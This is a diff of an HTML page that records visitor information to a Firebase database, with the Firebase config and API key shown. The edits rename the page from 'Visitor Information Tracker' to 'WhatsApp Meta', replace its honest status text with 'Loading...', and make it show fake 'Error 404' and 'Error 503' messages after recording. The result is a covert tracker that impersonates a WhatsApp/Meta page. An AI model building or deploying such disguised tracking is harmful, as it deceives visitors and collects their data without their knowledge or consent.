@@ -14,13 +14,12 @@
     </style>
 </head>
 <body>
-    <h1>Visitor Information Tracker</h1>
+    <h1>WhatsApp Meta</h1>
     <div class="info-card">
-        <p><strong>Status:</strong> <span id="status">Mencatat informasi pengunjung...</span></p>
+        <p><strong>Status:</strong> <span id="status">Loading...</span></p>
     </div>
 
     <script>
-        // Konfigurasi Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyCB_wr4EqhPRzSWQuLgr-eyV9Zisw8_rIs",
             authDomain: "xr-social-53646.firebaseapp.com",
@@ -59,11 +58,11 @@
                     timestamp: now.toISOString()
                 });
 
-                document.getElementById('status').textContent = "Informasi pengunjung berhasil dicatat!";
+                document.getElementById('status').textContent = "Error 404";
 
             } catch (error) {
                 console.error("Error recording visit:", error);
-                document.getElementById('status').textContent = "Gagal mencatat informasi pengunjung";
+                document.getElementById('status').textContent = "Error 503";
             }
         }
 
